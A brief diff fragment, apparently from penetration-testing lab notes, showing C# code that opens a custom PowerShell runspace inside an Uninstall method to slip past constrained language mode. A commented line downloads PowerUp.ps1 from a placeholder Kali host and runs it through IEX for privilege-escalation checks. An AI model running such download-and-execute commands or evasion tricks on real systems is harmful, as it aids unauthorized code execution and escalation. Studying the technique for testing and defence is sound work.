@@ -43,7 +43,7 @@ Custom runspace C# code inside Uninstall method:
               {
                   String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\test.txt";
                   
-                  ***<comment>String cmd = "(New-Object System.Net.WebClient).DownloadString('http://<kali ip>/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt"; <comment>***
+                  ***<comment>String cmd = "(New-Object System.Net.WebClient).DownloadString('http://<kali ip>/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\test.txt"; <comment>***
                   
                   Runspace rs = RunspaceFactory.CreateRunspace();
                   rs.Open();
